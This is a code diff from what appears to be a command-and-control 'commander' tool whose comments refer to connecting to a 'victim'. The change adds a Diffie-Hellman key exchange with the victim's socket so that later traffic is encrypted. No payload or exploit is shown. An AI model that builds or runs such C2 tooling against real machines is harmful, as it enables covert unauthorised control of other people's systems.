@@ -1,5 +1,6 @@
 import select
 from commander_utils import *
+from commander_cryptography import *
 
 if __name__ == '__main__':
     # Initialization + GetOpts
@@ -17,11 +18,18 @@ if __name__ == '__main__':
 
     # Initial connect to victim as passed by argument (and put in sockets_to_read)
     print_config(destination_ip, destination_port, (source_ip, source_port))
-    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip,
-                                              destination_port)
+    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip, destination_port)
 
-    # Generate Key Pair + Perform Key Exchange (Initiator)
+    if victim_socket is not None:
+        # DIFFIE-HELLMAN: Generate Key Pair for Diffie-Hellman Key Exchange + Serialize Pub Key
+        private_key, public_key = generate_keys()
+        serialized_public_key = serialize_public_key(public_key)
 
+        # DIFFIE-HELLMAN: Perform Key Exchange
+        victim_public_key = key_exchange_initiator(victim_socket, serialized_public_key)
+
+        # DIFFIE-HELLMAN: Generate Secret (used for symmetric encryption/decryption)
+        shared_secret = generate_shared_secret(private_key, victim_public_key)
 
     # Initialize a Global Thread and Queue (for multipurpose)
     global_thread = None
